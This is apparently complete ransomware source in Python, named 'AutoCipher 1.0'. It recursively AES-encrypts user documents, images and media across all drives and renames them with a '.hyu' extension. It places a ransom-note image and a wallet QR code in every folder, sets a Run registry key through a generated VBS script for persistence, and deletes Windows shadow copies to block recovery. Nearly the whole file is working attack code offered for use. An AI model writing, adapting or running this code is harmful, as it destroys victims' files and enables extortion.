#-*- coding: utf-8 -*-
# AutoCipher 1.0
# Creator: Malcolm Mami

import os
from os.path import expanduser
import win32api  # get all system drives
import time

# create QR Code
import qrcode

# create img file
from PIL import Image, ImageFont, ImageDraw

# user home
user_homepath = expanduser("~")

size = (800,650)            # size of the image to create
im = Image.new('RGB', size) # create the image
draw = ImageDraw.Draw(im)   # create a drawing object that is
red = (255,0,0)             # color of our text

# full address
full_addr = ("ADD HEX INFO HERE TO GENERATE A QR-CODE LINK")
# creating img file
img = qrcode.make(full_addr)

# ACCOUNT (encrypted secret pin)
accountA = ("47WwdAwspQG8oD9We1dKFL96DwgCjRrPnh")
accountB = ("SLuFXMsyPFfw3eLRxNzBuKS6okHatTGTJF")
accountC = ("SooydeACuWBJqNsHxXgXFfgLzAz")

text_pos1 = (50,40) 
text_pos2 = (50,70) 

text_pos4 = (60,140)
text_pos4b = (60,180)
text_pos4c = (60,220)

text_pos5 = (60,260) 
text_pos5a = (60,290)
text_pos6 = (60,320)
text_pos7 = (60,350)
text_pos8 = (60,380)
text_pos9 = (60,410)
text_pos10 = (60,440)

text1 = ("YOUR DATA HAS BEEN ENCRYPTED")
text2 = ("If you want it back, - - - - - -")

text4 =  (accountA)
text4b = (accountB)
text4c = (accountC)

text5 = ("Inside : " + user_homepath)
text5a = ("there is a zip archive named: dcp.zip")
text6 = ("extract it and run decryptor.exe to unlock all your data.")
text7 = ("To activate the decryption process you will need a PIN-CODE:")
text8 = ("- - - - Additional Info - - - - -")
text9 = ("the PIN-CODE required to unlock decryptor.exe.")
text10 = ("Additional info . . . . .")

fontsize = ImageFont.truetype('arial.ttf', 25)
fontsize2 = ImageFont.truetype('consola.ttf', 28)

# Now, we'll do the drawing: 
draw.text(text_pos1, text1, font=fontsize, fill=red)
draw.text(text_pos2, text2, font=fontsize, fill=red)

draw.text(text_pos4, text4, font=fontsize2, fill=(0,255,0))
draw.text(text_pos4b, text4b, font=fontsize2, fill=(0,255,0))
draw.text(text_pos4c, text4c, font=fontsize2, fill=(0,255,0))

draw.text(text_pos5, text5, font=fontsize, fill=red)
draw.text(text_pos5a, text5a, font=fontsize, fill=red)
draw.text(text_pos6, text6, font=fontsize, fill=red)
draw.text(text_pos7, text7, font=fontsize, fill=red)
draw.text(text_pos8, text8, font=fontsize, fill=red)
draw.text(text_pos9, text9, font=fontsize, fill=red)
draw.text(text_pos10, text10, font=fontsize, fill=red)
    
del draw # I'm done drawing so I don't need this anymore

# name of PNG file info
name_png = ("\\INFO_PLEASE_README.png")
# name of PNG qrcode
name_qr = ("\\WALLET_QRCODE.png")

# Main progr
# crypto-chiper
import base64
from Crypto.Cipher import AES

BLOCK_SIZE = 16
IV = 'c8R1li6ctz03qeQp'	
secret = 'x93kft29flwrYwcU9v0qazr16HxC3M1m'

# Obtain sys drives
system_drives = []
system_drives = win32api.GetLogicalDriveStrings()
system_drives = system_drives.split('\000')[:-1]

# accepted extensions (no PNG!)
file_extensions = ['txt','contact','csv','lnk','doc','docx','fdb',
            'xls','xlm','xlsx','xlsm','ppt','p7m','pps',
            'pptx','ppsx','pst','ost','odt','ods','odp',
            'odg','xml','jpg','jpeg','gif','pdf',
            'psd','dwg','3mf','ai','amf','cdr','dds',
            'dxf','obj','svg','db','fdb','mdb','accdb',
            'sdb','mp3','wav','avi','mkv','mp4','tex','ltx','rtf']            
            
invalid_directory = ['$GetCurrent','$Recycle.Bin','$WinREAgent','$RECYCLE.BIN',
                    '$Windows.~WS','$WINDOWS.~BT','Windows','WindowsApps',
                    'Program Files','Program Files (x86)','PerfLogs',
                    'ProgramData','AppData','System Volume Information','MSOCache','ESD']

# mainloop
while (len(system_drives) > 0):

    temp_array = []
    
    for x in range(0,len(system_drives)):
    
        try:    
            working_path = system_drives[x]
            
            list = os.listdir(working_path)
            
            for file in range(0,len(list)):
                
                try:                
                    if os.path.isdir(working_path + list[file]):
                        
                        if list[file] not in invalid_directory:

                            temp_array.append(working_path + list[file] + '\\')
                            # save the warning PNG in every directory
                            im.save(working_path + list[file] + name_png, 'PNG')
                            # save qr code wallet in every directory
                            img.save(working_path + list[file] + name_qr, 'PNG')
                            
                        else:
                            pass
                        
                    # stuff on file
                    else:
                        file_path = (working_path + list[file])
                        
                        # file name complete
                        xname = file_path.split('\\')[-1]
                        
                        # file extension name
                        xname_ext = xname.split('.')[-1]
                        
                        if xname_ext in file_extensions:

                            # file operations
                            f = open(file_path, 'rb') # Read
                            data = f.read()
                            f.close()                            
                            w = open(file_path, 'wb') # Write
                            cipher = AES.new(secret, AES.MODE_CFB, IV)                            
                            enc_data = cipher.encrypt(data)                            
                            w.write(enc_data)                            
                            w.close()                            
                            os.rename(file_path, file_path + ".hyu")                        
                
                except:
                    pass
                
        except:
            pass

    system_drives = temp_array
    
    time.sleep(0.2)

# Set startup popup open program advice
img_file_path = (user_homepath + name_png)
# REGEDIT
def startup(img_file_path, user_homepath):

    if os.path.exists(img_file_path)==True:
    
        reg_script = (user_homepath + "\\load.vbs")
    
        f = open(reg_script,"wb")
        f.write('Set WshShell = CreateObject("WScript.Shell")\n')
        f.write('myKey = "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run\Manifest"\n')
        f.write('path = "' + img_file_path + '"\n')
        f.write('WshShell.RegWrite myKey,path,"REG_SZ"')
        f.close()
        
    os.system(reg_script)

startup(img_file_path, user_homepath)

# Try to delete shadow copies
try:
    # Delete shadows (WORKS ONLY IF YOU HAVE ADMIN RIGHTS)
    os.system("wmic.exe shadowcopy delete /nointeractive")
except:
    pass
